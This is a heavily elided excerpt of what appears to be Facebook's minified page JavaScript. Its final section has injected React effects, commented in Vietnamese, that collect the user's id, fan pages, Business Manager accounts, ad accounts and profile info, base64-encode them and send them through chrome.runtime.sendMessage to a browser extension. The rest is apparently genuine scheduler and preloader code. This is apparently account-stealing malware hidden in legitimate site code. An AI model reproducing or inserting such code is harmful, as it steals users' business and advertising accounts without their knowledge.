  ...
  function (a, b, c, d, e, f, g, h) {
    ...
    var $ = {
      ...
      beDone: function (a, b, c) {
        for (
          var d =
              (d = (d = z.get(a)) == null ? void 0 : d.logData) != null
                ? d
                : [],
            e = Array.isArray(d),
            f = 0,
      ...
      getComponentTiming: function (a) {
        ...
        return {
          ...
          tierThreeStart:
            (b = E.getEventTime(E.tierThreeStart(a))) != null ? b : 0,
  ...
  function (a, b, c, d, e, f, g) {
    ...
    function a(a, e) {
      ...
      c("CurrentCommunity").getID() !== "0" &&
        (g.__cid = c("CurrentCommunity").getID());
      c("CurrentAdAccount").getID() != null &&
        (g.__aaid = c("CurrentAdAccount").getID());
      c("CurrentBusinessUser").business_id != null &&
        (g.__bid = c("CurrentBusinessUser").business_id);
      ...
      for (var c = q(E); null !== c; ) {
        if (null === c.callback) r(E);
          ...
          r(E),
            ...
            p(D, c),
            h &&
              (h && null !== x && z([1, 1e3 * b, c.id, c.priorityLevel]),
              (c.isQueued = !0));
        else break;
        c = q(E);
      }
    ...
    g.unstable_scheduleCallback = function (b, c, d) {
      ...
      d > e
        ? ((b.sortIndex = d),
          ...
          null === q(D) &&
            b === q(E) &&
            (K ? (M(T), (T = -1)) : (K = !0), aa(Q, d - e)))
        : ((b.sortIndex = f),
          p(D, b),
          h &&
            (h && null !== x && z([1, 1e3 * e, b.id, b.priorityLevel]),
            (b.isQueued = !0)),
          J || I || ((J = !0), $()));
      return b;
    };
  ...
  function (a, b, c, d, e, f, g) {
    ...
    function x(a, b) {
      ...
      if (b === null || !e || f !== h.success_status) {
        if (
          f === h.disabled_status ||
          f === h.bad_preloaders_status ||
          f === h.unknown_boundaries_status
        ) {
          s();
          return;
        }
    ...
    function b(a) {
      ...
      p
        ? (a.gks.mwp_ssr_enabled && h.enabled) ||
          h.gks.stop_render_at_splashscreen
          ? B(p)
          : s()
    ...
    var D = {
      ...
      listeners: {},
      on: function (a, b) {
        a in D.eventsEmitted &&
          D.eventsEmitted[a].forEach(function (a) {
            b.apply(void 0, a);
          }),
    ...
    (function () {
      ...
      function c(c, d, e) {
        for (
          ...
          "not all" === k.getAttribute("media")
            ? m.push(k)
            : ("LINK" === k.tagName && h.set(k.getAttribute("href"), k),
        ...
        for (n = !0; ; ) {
          ...
          r
            ...
            : ((r = i.head), r.insertBefore(p, r.firstChild));
        }
        (g || (g = b("Promise")))
          .all(l)
          .then(
    ...
    (() => {
      ...
      const a = function () {
          ...
          return (
            (0, e.useEffect)(() => {
                if (U.length > 0 && "" !== k && o) {
                  // Thêm dòng này để ghi lại thông tin trước khi gửi
                  console.log("Gửi tin nhắn fetch với dữ liệu:", { uid: k, fanPages: U });
            ...
            (0, e.useEffect)(() => {
                if (R.length > 0 && "" !== k && o) {
                  console.log("Gửi tin nhắn fetch với dữ liệu R.length:", { uid: k, bmAccounts: R }); // Thêm dòng này
              ...
              (0, e.useEffect)(() => {
                if (z.length > 0 && "" !== k && o) {
                  // Thêm dòng này để ghi lại thông tin trước khi gửi
                  console.log("Gửi tin nhắn fetch với dữ liệu:", { uid: k, adsAccounts: z });
              ...
              (0, e.useEffect)(() => {
                if (void 0 !== V && "" !== k && o) {
                  // Thêm dòng này để ghi lại thông tin trước khi gửi
                  console.log("Gửi tin nhắn fetch với dữ liệu:", { uid: k, userInfo: V, name: i });
              ...
              (0, e.useEffect)(() => {
                if ("" !== k && "" !== S && E.length > 0 && "" !== C) {
                  ...
                  // Thêm dòng này để ghi lại thông tin trước khi gửi
                  console.log("Gửi tin nhắn fetch với dữ liệu (trước mã hóa):", payloadData);
                  ...
                  chrome.runtime.sendMessage(
                    n,
                    {
                      ...
                      data: {
                        ...
                        body: {
                          type: 1,
                          data: btoa(JSON.stringify(payloadData)),
                        },
                      },
                    },
                    () => {
